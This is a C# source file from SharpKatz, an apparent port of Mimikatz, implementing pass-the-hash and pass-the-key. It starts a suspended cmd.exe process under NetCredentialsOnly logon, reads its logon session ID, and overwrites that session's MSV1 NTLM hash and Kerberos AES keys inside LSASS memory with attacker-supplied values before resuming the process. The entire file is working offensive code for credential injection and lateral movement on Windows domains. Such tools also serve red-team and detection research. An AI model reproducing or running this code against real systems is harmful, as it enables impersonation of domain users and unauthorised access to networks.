//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using SharpKatz.Credential;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static SharpKatz.Module.SharpKerberos;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    internal class Ptp
    {
        public const int AES_128_KEY_LENGTH = 16;
        public const int AES_256_KEY_LENGTH = 32;

        public static int CreateProcess(IntPtr hProcess, IntPtr lsasrvMem, IntPtr kerberos, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, string user, string domain, string ntlmHash = null, string aes128 = null, string aes256 = null, string rc4 = null, string binary = "cmd.exe", string arguments = "", string luid = null, bool impersonate = false)
        {
            TOKEN_STATISTICS tokenStats = new TOKEN_STATISTICS();
            byte[] aes128bytes = null;
            byte[] aes256bytes = null;
            Pth.SEKURLSA_PTH_DATA data = new Pth.SEKURLSA_PTH_DATA();
            byte[] ntlmHashbytes = null;
            int procid;

            if (!string.IsNullOrEmpty(luid))
            {
                tokenStats.AuthenticationId.HighPart = 0;
                tokenStats.AuthenticationId.LowPart = uint.Parse(luid);
                data.LogonId = tokenStats.AuthenticationId;
            }
            else
            {
                if (string.IsNullOrEmpty(user))
                {
                    Console.WriteLine("[x] Missing required parameter user");
                    return 1;
                }

                if (string.IsNullOrEmpty(domain))
                {
                    Console.WriteLine("[x] Missing required parameter domain");
                    return 1;
                }
            }

            try
            {
                if (!string.IsNullOrEmpty(aes128))
                {
                    aes128bytes = Utility.StringToByteArray(aes128);

                    if (aes128bytes.Length != AES_128_KEY_LENGTH)
                        throw new System.ArgumentException();

                    data.Aes128Key = aes128bytes;

                    Console.WriteLine("[*] AES128\t: {0}", Utility.PrintHexBytes(aes128bytes));
                }
            }
            catch (Exception)
            {
                Console.WriteLine("[x] Invalid aes128 key");
                return 1;
            }

            try
            {
                if (!string.IsNullOrEmpty(aes256))
                {
                    aes256bytes = Utility.StringToByteArray(aes256);

                    if (aes256bytes.Length != AES_256_KEY_LENGTH)
                        throw new System.ArgumentException();

                    data.Aes256Key = aes256bytes;

                    Console.WriteLine("[*] AES256\t: {0}", Utility.PrintHexBytes(aes256bytes));
                }
            }
            catch (Exception)
            {
                Console.WriteLine("[x] Invalid aes128 key");
                return 1;
            }

            try
            {
                if (!string.IsNullOrEmpty(rc4))
                    ntlmHashbytes = Utility.StringToByteArray(rc4);

                if (!string.IsNullOrEmpty(ntlmHash))
                    ntlmHashbytes = Utility.StringToByteArray(ntlmHash);

                if (ntlmHashbytes.Length != Msv1.LM_NTLM_HASH_LENGTH)
                    throw new System.ArgumentException();

                data.NtlmHash = ntlmHashbytes;
            }
            catch (Exception)
            {
                Console.WriteLine("[x] Invalid Ntlm hash/rc4 key");
                return 1;
            }

            if (data.NtlmHash != null || data.Aes128Key != null || data.Aes256Key != null)
            {
                if (!string.IsNullOrEmpty(luid))
                {
                    Pth_luid(hProcess, lsasrvMem, kerberos, oshelper, iv, aeskey, deskey, ref data);
                }
                else if (!string.IsNullOrEmpty(user))
                {
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    if (CreateProcessWithLogonW(user, "", domain, @"C:\Windows\System32\", binary, arguments, CreationFlags.CREATE_SUSPENDED, ref pi))
                    {
                        procid = pi.dwProcessId;
                        IntPtr hToken = IntPtr.Zero;

                        if (OpenProcessToken(pi.hProcess, TOKEN_READ | (impersonate ? TOKEN_DUPLICATE : 0), out hToken))
                        {
                            IntPtr hTokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(tokenStats));
                            Marshal.StructureToPtr(tokenStats, hTokenInformation, false);

                            uint retlen = 0;

                            if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenStatistics, hTokenInformation, (uint)Marshal.SizeOf(tokenStats), out retlen))
                            {
                                tokenStats = (TOKEN_STATISTICS)Marshal.PtrToStructure(hTokenInformation, typeof(TOKEN_STATISTICS));
                                data.LogonId = tokenStats.AuthenticationId;

                                Pth_luid(hProcess, lsasrvMem, kerberos, oshelper, iv, aeskey, deskey, ref data);

                                if (data.isReplaceOk)
                                {
                                    NtResumeProcess(pi.hProcess);
                                    return procid;
                                }
                                else
                                {
                                    NtTerminateProcess(pi.hProcess, (uint)NTSTATUS.ProcessIsTerminating);
                                }
                            }
                            else
                            {
                                Console.WriteLine("[x] Error GetTokenInformazion");
                                return 1;
                            }
                        }
                        else
                        {
                            Console.WriteLine("[x] Error open process");
                            return 1;
                        }
                    }
                    else
                    {
                        Console.WriteLine("[x] Error process create");
                        return 1;
                    }
                }
                else
                {
                    Console.WriteLine("[x] Bad user or LUID");
                    return 1;
                }
            }
            else
            {
                Console.WriteLine("[x] Missing at least one argument : ntlm/rc4 OR aes128 OR aes256");
                return 1;
            }
            return 0;
        }

        private static void Pth_luid(IntPtr hProcess, IntPtr lsasrvMem, IntPtr kerberos, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, ref Pth.SEKURLSA_PTH_DATA data)
        {
            List<Logon> logonlist = new List<Logon>();
            LogonSessions.FindCredentials(hProcess, lsasrvMem, oshelper, iv, aeskey, deskey, logonlist);
            Msv1.WriteMsvCredentials(hProcess, oshelper, iv, aeskey, deskey, logonlist, ref data);
            List<KerberosLogonItem> klogonlist = SharpKerberos.FindCredentials(hProcess, kerberos, oshelper, iv, aeskey, deskey, logonlist);
            foreach (KerberosLogonItem s in klogonlist)
            {
                SharpKerberos.WriteKerberosKeys(ref hProcess, s, oshelper, iv, aeskey, deskey, ref data);
            }
        }

        public static bool CreateProcessWithLogonW(string username, string password, string domain, string path, string binary, string arguments, CreationFlags cf, ref PROCESS_INFORMATION processInformation)
        {
            STARTUPINFO startupInfo = new STARTUPINFO();
            startupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
            processInformation = new PROCESS_INFORMATION();
            if (!Win32.Natives.CreateProcessWithLogonW(username, domain, password,
                LogonFlags.NetCredentialsOnly, path + binary, path + binary + " " + arguments, cf, 0, path, ref startupInfo, out processInformation))
            {
                return false;
            }
            return true;
        }
    }
}